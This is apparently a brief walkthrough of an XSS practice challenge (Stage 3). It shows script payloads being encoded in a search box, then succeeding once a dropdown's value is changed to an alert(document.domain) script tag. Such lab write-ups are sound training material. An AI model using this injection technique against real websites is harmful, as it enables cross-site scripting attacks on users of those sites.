# **XSS Challenges Stage 3**

![](https://i.imgur.com/G7nARMz.png)

```
<hr class=red>We couldn't find any places called <b>"123"</b> in <b>Japan</b>.<hr class=red>
```

Is that the same to Stage 1?

![](https://i.imgur.com/CXgUxrV.png)

```
<hr class=red>We couldn't find any places called <b>"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</b> in <b>Japan</b>.<hr class=red>
```

Well, Of course not.

How about input box?

```
Search a place: <input size="30" type="text" name="p1">
```

![](https://i.imgur.com/TS0TVTb.png)

Cuz to `type = "text"` in ```Search a place: <input size="30" type="text" name="p1">```.

All the Symbols get HTML coded.
```
<b>"&gt;&lt;script&gt;alert(document.domain);&lt;/script"</b>
```

Failed.

The last one, let's try to modify the dropdowns.

![](https://i.imgur.com/7sBVgyS.png)

Change `Japan` to `<script>alert(document.domain);</script>`, also remenber to insert something in first input box, otherwise it will not correctly execute.

![](https://i.imgur.com/DaiKsgQ.png)

